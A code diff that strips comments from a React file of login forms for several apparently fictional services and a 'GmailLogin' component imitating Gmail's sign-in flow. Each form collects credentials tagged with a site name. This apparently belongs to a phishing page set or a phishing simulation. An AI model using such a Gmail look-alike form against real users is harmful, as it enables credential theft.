@@ -23,8 +23,7 @@ function ZenithAuth({ onNavigate }) {
     const corporate_email = e.target.corporate_email.value;
     const password = e.target.password.value;
     const site_name = "ZenithAuth";
-    
-    // Validate the email field before submitting to the backend
+  
     if (!corporate_email) {
       setMessage('Please enter a corporate email.');
       return;
@@ -84,7 +83,7 @@ function QuantumFlow({ onNavigate }) {
     const project_token = e.target.project_token.value;
     const site_name = "QuantumFlow";
     
-    // Validate the username field before submitting
+    
     if (!username) {
       setMessage('Please enter a username.');
       return;
@@ -147,7 +146,7 @@ function StellarConnect({ onNavigate }) {
     const password = e.target.password.value;
     const site_name = "StellarConnect";
     
-    // Validate the email or phone field before submitting
+    
     if (!email_or_phone) {
       setMessage('Please enter an email or phone number.');
       return;
@@ -199,14 +198,14 @@ function StellarConnect({ onNavigate }) {
 
 function GmailLogin({ onNavigate }) {
   const [message, setMessage] = useState('');
-  const [step, setStep] = useState('email'); // 'email' or 'password'
+  const [step, setStep] = useState('email'); 
   const [emailValue, setEmailValue] = useState('');
 
   const handleEmailSubmit = async (e) => {
     e.preventDefault();
     const email = e.target.email.value;
     
-    // Validate the email field before proceeding
+    
     if (!email) {
       setMessage('Enter an email or phone number.');
       return;
@@ -222,7 +221,7 @@ function GmailLogin({ onNavigate }) {
     const password = e.target.password.value;
     const site_name = "Gmail";
     
-    // Validate the password field before submitting
+    
     if (!password) {
       setMessage('Enter a password.');
       return;
@@ -335,7 +334,6 @@ function GmailLogin({ onNavigate }) {
           </div>
 
           <div className="flex items-center justify-between">
-            {/* The "Back" button is styled as a link, so we will not apply a background to it */}
             <button
               type="button"
               onClick={handleBackToEmail}
